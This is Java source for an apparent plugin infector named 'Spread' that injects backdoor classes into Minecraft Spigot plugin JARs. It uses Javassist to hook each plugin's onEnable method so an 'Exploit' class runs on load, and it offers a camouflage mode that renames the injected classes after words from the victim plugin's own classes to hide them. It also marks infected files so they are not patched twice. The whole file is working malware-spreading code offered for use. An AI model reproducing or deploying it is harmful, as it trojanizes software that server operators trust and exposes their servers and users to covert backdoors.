package com.tmquan2508.exploit;

import javassist.*;
import org.apache.commons.lang3.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class Spread {
    private static class CamouflageUtils {
        public record CamouflagePlan(String packageName, String namePrefix) {}
        private static final Random RANDOM = new Random();
        private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

        public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
            logMessage("[Camouflage] Analyzing JAR file to generate camouflage plan...");
            Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);

            if (packageStructure.isEmpty()) {
                logMessage("[Camouflage] WARNING: Target JAR contains no class files. Using fallback camouflage.");
                return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
            }

            List<Map.Entry<String, List<String>>> packagesSortedByClassCount = packageStructure.entrySet().stream()
                    .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
                    .sorted((e1, e2) -> Integer.compare(e2.getValue().size(), e1.getValue().size()))
                    .collect(Collectors.toList());

            if (packagesSortedByClassCount.isEmpty()) {
                throw new IllegalStateException("Cannot generate camouflage plan: No suitable packages found in target JAR.");
            }

            Map.Entry<String, List<String>> chosenEntry = packagesSortedByClassCount.get(RANDOM.nextInt(Math.min(4, packagesSortedByClassCount.size())));
            String chosenPackagePath = chosenEntry.getKey();
            List<String> classNamesInPackage = chosenEntry.getValue();
            logMessage("[Camouflage] Selected package for camouflage: '" + chosenPackagePath + "'");

            List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);
            if (dictionary.isEmpty()) {
                logMessage("[Camouflage] WARNING: Could not build a word dictionary. Using fallback prefix 'Task'.");
                return new CamouflagePlan(chosenPackagePath, "Task");
            }
            logMessage("[Camouflage] Built a dictionary with " + dictionary.size() + " words.");

            String namePrefix = buildUniqueWordName(dictionary, classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList()), 1, 2);
            logMessage("[Camouflage] Generated camouflage name prefix: '" + namePrefix + "'");

            return new CamouflagePlan(chosenPackagePath, namePrefix);
        }

        private static List<String> buildWordDictionaryFrom(List<String> classNames) {
            return classNames.stream()
                    .map(className -> className.substring(0, className.lastIndexOf('.')))
                    .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
                    .map(word -> word.replace("$", ""))
                    .filter(word -> word.length() > 2)
                    .distinct()
                    .collect(Collectors.toList());
        }

        private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
            String name;
            int attempts = 0;
            do {
                int wordCount = minWords + RANDOM.nextInt(maxWords - minWords + 1);
                StringBuilder nameBuilder = new StringBuilder();
                for (int i = 0; i < wordCount; i++) {
                    nameBuilder.append(dictionary.get(RANDOM.nextInt(dictionary.size())));
                }
                name = nameBuilder.toString();
                if (attempts > 10) {
                    name += attempts;
                }
                attempts++;
            } while (existingNames.contains(name));
            return name;
        }

        private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
            Map<String, List<String>> packageMap = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarFile)) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.isDirectory() || !entry.getName().endsWith(".class")) continue;
                    String fullPath = entry.getName();
                    int lastSlash = fullPath.lastIndexOf('/');
                    String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                    packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
                }
            } catch (IOException e) { logMessage("[Camouflage] Error scanning JAR file: " + stackTrace(e)); }
            return packageMap;
        }
    }

    private static void logMessage(String message){ System.out.println(message); }
    private static String stackTrace(Exception e){
        StringWriter sw = new StringWriter(); PrintWriter pw = new PrintWriter(sw); e.printStackTrace(pw); return sw.toString();
    }

    private static List<String> getClassesToInject() throws IOException {
        URL resourceUrl = Spread.class.getResource("/META-INF/openbd.txt");
        if (resourceUrl == null) throw new IOException("CRITICAL: Resource /META-INF/openbd.txt not found.");
        try (InputStream is = resourceUrl.openStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
            return reader.lines().filter(line -> !line.trim().isEmpty()).collect(Collectors.toList());
        }
    }

    public static boolean patchFile(String orig, String out, boolean camouflage) {
        if (camouflage) {
            logMessage("[Spread] Camouflage mode is ENABLED.");
            return patchWithCamouflage(orig, out);
        } else {
            logMessage("[Spread] Camouflage mode is DISABLED. Using standard injection.");
            return patchStandard(orig, out);
        }
    }

    private static boolean patchWithCamouflage(String orig, String out) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);
        if (!Files.exists(input)) return false;

        try { Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING); }
        catch (IOException e) { logMessage("Error cloning file: " + stackTrace(e)); return false; }

        Map<String, Object> pluginYAML = readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) { logMessage("Not a valid Spigot plugin."); return false; }
        String mainClass = (String) pluginYAML.get("main");

        FileSystem outStream = null;
        ClassPool pool = new ClassPool(ClassPool.getDefault());

        try {
            CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(output.toFile());
            String originalPackage = "com.tmquan2508.exploit";
            String camouflagePackage = plan.packageName().replace('/', '.');
            logMessage("[Spread] Camouflage Plan: Relocate '" + originalPackage + "' -> '" + camouflagePackage + "' with prefix '" + plan.namePrefix() + "'");

            outStream = FileSystems.newFileSystem(output, (ClassLoader) null);
            if (Files.exists(outStream.getPath("/META-INF/openbd.txt"))) {
                logMessage("Plugin already patched. Skipping."); outStream.close(); return false;
            }

            pool.appendClassPath(new ClassClassPath(Spread.class));
            List<String> classPathsToInject = getClassesToInject();
            List<String> newInjectedPaths = new ArrayList<>();
            String camouflagedExploitFQN = null;

            Map<String, CtClass> collectedClasses = new LinkedHashMap<>();
            logMessage("[Spread] Phase 1: Collecting all original CtClass objects...");
            for (String classPath : classPathsToInject) {
                if (classPath.endsWith(".class")) {
                    String fqn = classPath.replace('/', '.').replace(".class", "");
                    try {
                        collectedClasses.put(fqn, pool.get(fqn));
                    } catch (NotFoundException e) {
                        logMessage("[Spread] WARNING: Class not found in pool: " + fqn + ". Skipping.");
                    }
                }
            }
            logMessage("[Spread] Collected " + collectedClasses.size() + " CtClass objects.");

            logMessage("[Spread] Phase 2: Building relocation map with dynamic names...");
            ClassMap classMap = new ClassMap();
            for (String originalClassName : collectedClasses.keySet()) {
                if (originalClassName.startsWith(originalPackage + ".")) {
                    String simpleClassName = originalClassName.substring(originalPackage.length() + 1);
                    String newClassName = camouflagePackage + "." + plan.namePrefix() + simpleClassName;
                    classMap.put(originalClassName, newClassName);
                }
            }
            logMessage("[Spread] Relocation map built. Size: " + classMap.size());

            logMessage("[Spread] Phase 3: Executing relocation and writing...");
            for (Map.Entry<String, CtClass> entry : collectedClasses.entrySet()) {
                String originalClassName = entry.getKey();
                CtClass cc = entry.getValue();
                cc.replaceClassName(classMap);
                String newClassName = cc.getName();

                if (!originalClassName.equals(newClassName)) {
                    logMessage("  Relocated: " + originalClassName + " -> " + newClassName);
                } else {
                    logMessage("  Injected (no relocation): " + originalClassName);
                }

                if (originalClassName.equals(originalPackage + ".Exploit")) {
                    camouflagedExploitFQN = newClassName;
                }

                String newPathInJar = newClassName.replace('.', '/') + ".class";
                Path targetPath = outStream.getPath(newPathInJar);
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                Files.write(targetPath, cc.toBytecode());
                newInjectedPaths.add(newPathInJar);
            }

            if (newInjectedPaths.isEmpty()) {
                throw new IllegalStateException("Injection failed: No classes were written to the JAR.");
            }

            logMessage("[Spread] Phase 4: Making new classes available to the ClassPool...");
            for (CtClass cc : collectedClasses.values()) {
                pool.insertClassPath(new ByteArrayClassPath(cc.getName(), cc.toBytecode()));
            }


            logMessage("[Spread] Phase 5: Patching the main plugin class...");

            Path openBdTargetPath = outStream.getPath("/META-INF/openbd.txt");
            if (openBdTargetPath.getParent() != null) Files.createDirectories(openBdTargetPath.getParent());
            Files.write(openBdTargetPath, String.join("\n", newInjectedPaths).getBytes(StandardCharsets.UTF_8));

            if (camouflagedExploitFQN == null) throw new IllegalStateException("Failed to find new name for Exploit class.");
            
            pool.appendClassPath(orig);
            CtClass ccMain = pool.get(mainClass);
            CtMethod m = ccMain.getDeclaredMethod("onEnable");
            String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", camouflagedExploitFQN);
            
            logMessage("[Spread] Injecting code: " + injectionCode);
            m.insertAfter(injectionCode);
            
            Files.write(outStream.getPath(mainClass.replace('.', '/') + ".class"), ccMain.toBytecode(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
            
            ccMain.detach();
            for (CtClass cc : collectedClasses.values()) {
                cc.detach();
            }

            logMessage("Successfully patched with CAMOUFLAGE: " + output.getFileName());

        } catch (Exception e) {
            logMessage("A critical error occurred during CAMOUFLAGE patching process.\n" + stackTrace(e));
            try { if (outStream != null) outStream.close(); Files.deleteIfExists(output); }
            catch (IOException ex) { logMessage("Error during cleanup: " + stackTrace(ex)); }
            return false;
        } finally {
            if (outStream != null) try { outStream.close(); } catch (IOException e) {}
        }
        return true;
    }

    private static boolean patchStandard(String orig, String out) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);
        if (!Files.exists(input)) return false;

        try { Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING); }
        catch (IOException e) { logMessage("Error cloning file: " + stackTrace(e)); return false; }

        Map<String, Object> pluginYAML = readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) { logMessage("Not a valid Spigot plugin."); return false; }
        String mainClass = (String) pluginYAML.get("main");

        FileSystem outStream = null;
        try {
            outStream = FileSystems.newFileSystem(output, (ClassLoader) null);
            if (Files.exists(outStream.getPath("/META-INF/openbd.txt"))) {
                logMessage("Plugin already patched. Skipping."); outStream.close(); return false;
            }

            List<String> resourcesToInject = getClassesToInject();
            for (String resourcePath : resourcesToInject) {
                Path targetPath = outStream.getPath(resourcePath);
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                try (InputStream sourceStream = Spread.class.getResourceAsStream("/" + resourcePath)) {
                    if (sourceStream == null) throw new IOException("Cannot find resource: " + resourcePath);
                    Files.copy(sourceStream, targetPath);
                }
            }
            Files.write(outStream.getPath("/META-INF/openbd.txt"), "patched_standard".getBytes(StandardCharsets.UTF_8));


            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(orig);
            CtClass ccMain = pool.get(mainClass);
            CtMethod m = ccMain.getDeclaredMethod("onEnable");
            String injectionCode = "{ try { new com.tmquan2508.exploit.Exploit((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }";
            m.insertAfter(injectionCode);
            Files.write(outStream.getPath(mainClass.replace('.', '/') + ".class"), ccMain.toBytecode(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
            ccMain.detach();
            logMessage("Successfully patched with STANDARD injection: " + output.getFileName());

        } catch (Exception e) {
            logMessage("A critical error occurred during STANDARD patching process.\n" + stackTrace(e));
            try { if (outStream != null) outStream.close(); Files.deleteIfExists(output); }
            catch (IOException ex) { logMessage("Error during cleanup: " + stackTrace(ex)); }
            return false;
        } finally {
            if (outStream != null) try { outStream.close(); } catch (IOException e) {}
        }
        return true;
    }


    private static Map<String, Object> readPluginYAML(String path) {
        Yaml yamlData = new Yaml(); InputStream is = null;
        String inputFile = null;
        if (SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC) inputFile = "jar:file://" + path + "!/plugin.yml";
        if (SystemUtils.IS_OS_WINDOWS) inputFile = "jar:file:/" + path + "!/plugin.yml";
        try {
            if (inputFile != null) {
                JarURLConnection connection = (JarURLConnection) new URL(inputFile).openConnection();
                connection.setUseCaches(false); is = connection.getInputStream();
            }
        } catch (IOException e) { return null; }
        if (is == null) return null;
        try (InputStream finalIs = is) { return yamlData.load(finalIs); } catch (Exception e) { return null; }
    }
}